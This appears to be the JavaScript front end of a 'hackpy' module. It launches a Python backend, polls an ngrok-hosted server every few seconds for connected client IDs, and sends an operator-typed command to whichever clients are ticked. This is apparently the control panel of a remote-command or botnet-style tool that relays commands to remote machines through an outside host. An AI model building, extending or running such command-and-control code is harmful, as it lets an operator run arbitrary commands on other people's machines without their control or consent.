import { addCommand, terminalCommands } from "../../views/js/commands.js";

let localClientsList = []

export function initModule() {
  console.info("Soy un gato");
}

export function startModule() {
  terminalCommands[1]("python", "modules/hackpy/root/main.py");

  hackpy()
}

export function hackpy(){
  localClientsList = []
  // Ejecutar un comando en el terminal usando la función terminalCommands
  addCommand(hackpy)

  // Abre el modal y luego configura el eventListener
  openModal("../modules/hackpy/view.js")
    .then(() => {
      const submitBtn = document.getElementById("submitCommand");
      if (submitBtn) {
        submitBtn.addEventListener("click", submitSelectedCommands);
        loadCSS("../modules/hackpy/main.css", document.getElementById("hackpy"));
        loadScript(
          "module",
          "https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js", document.head
        ).then(() => {
          startListeningForClients();
        });
      } else {
        console.error("No se encontró el botón submitCommand");
      }
    })
    .catch((error) => {
      console.error("Error en el proceso:", error);
    });
}

async function submitSelectedCommands() {
  const checkboxes = document.querySelectorAll("#clientsContainer input[type='checkbox']:checked");
  const command = document.getElementById("command").value;

  if (checkboxes.length === 0) {
    console.error("Error: No checkboxes selected.");
    return;
  }

  // Crear un nuevo objeto local para cada envío
  const commandClientMap = {};

  checkboxes.forEach(checkbox => {
    const clientId = checkbox.id.replace('clientCheckbox_', '');
    commandClientMap[clientId] = { command: command };
  });
  console.log("Prepared data to send:", JSON.stringify(commandClientMap, null, 2));

  // Enviar el objeto completo al servidor
  try {
    const response = await fetch("https://flexible-elk-monthly.ngrok-free.app/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(commandClientMap),
    });

    if (response.ok) {
      const data = await response.json();
      console.log("Commands sent:", data);
      // Asegúrate de que la respuesta se maneje como JSON
      console.log("Received data:", JSON.stringify(data, null, 2)); // Formatea el JSON para verlo claramente
    } else {
      console.error("Error sending commands:", response.status, response.statusText);
    }
  } catch (error) {
    console.error("Error sending commands:", error);
  }
}


function updateClientList() {
  fetch("https://flexible-elk-monthly.ngrok-free.app/current_clients", {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
      "ngrok-skip-browser-warning": "skip-browser-warning",
    },
  })
    .then((response) => response.json())
    .then((data) => {
      const clientsDiv = document.getElementById("clientsContainer");
      if (data.clients_list) {
        console.log(data);

        // Filtrar los IDs de cliente que aún no están en la lista local
        const newClients = data.clients_list.filter(clientId => !localClientsList.includes(clientId));

        // Actualizar la lista local con los nuevos clientes
        localClientsList = [...localClientsList, ...newClients];

        // Agregar cada nuevo client_id a un nuevo elemento en el div
        newClients.forEach((clientId) => {
          const clientTemplate = `
          <div id="checkboxContainer" class="pop-in">
            <label class="custom-checkbox">
              <input type="checkbox" id="clientCheckbox_${clientId}" />
              <span class="checkmark"></span>
              <span class="client-number">${clientId}</span>
            </label>
          </div>
          `;
          clientsDiv.insertAdjacentHTML("beforeend", clientTemplate);
        });
      } else {
        console.error("Error: No clients list found in response.");
      }
    })
    .catch((error) => console.error("Error:", error));
}

// Inicia la escucha continua para actualizaciones de clientes
function startListeningForClients() {
  setInterval(updateClientList, 5000);
}
